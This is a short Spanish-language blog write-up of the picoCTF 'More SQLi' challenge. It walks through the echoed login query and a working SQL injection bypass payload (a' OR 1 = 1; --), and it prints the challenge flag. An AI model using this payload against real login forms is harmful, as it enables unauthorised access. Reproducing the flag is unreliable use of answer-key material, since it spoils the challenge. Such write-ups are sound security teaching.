---
title: More SQLi
date: 2025-05-14 13:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, more sqli, explotación web]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---

>More SQLi
Author: Mubarak Mikail
Description
Can you find the flag on this website. Try to find the flag here.
{: .prompt-tip }

Como este ejercicio va de injecciones SQL empezamos con el típico '1 = 1' para ver el resultado. 

``` html
username: admin
password: 1 = 1
SQL query: SELECT id FROM users WHERE password = '1 = 1' AND username = 'admin'

```
Viendo esto, creo que podemos intentar injectar con un OR, añadiendo "--" para comentar el resto de la query, etc.
Luego podemos ver como queda la query e ir retocándola.

``` 
SELECT id FROM users WHERE password = 'pass OR 1 = 1' AND username = 'admin'
pass OR 1 = 1 --'

```

Finalmente compruebo que esta funciona. También puedes usar herramientas automáticas como un Fuzzer o SQLMap

``` 
a' OR 1 = 1; --
```


``` html
username: test
password: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}
SQL query: SELECT id FROM users WHERE password = 'picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}' AND username = 'test'
```

flag: **picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}**

Una de SQLi. 
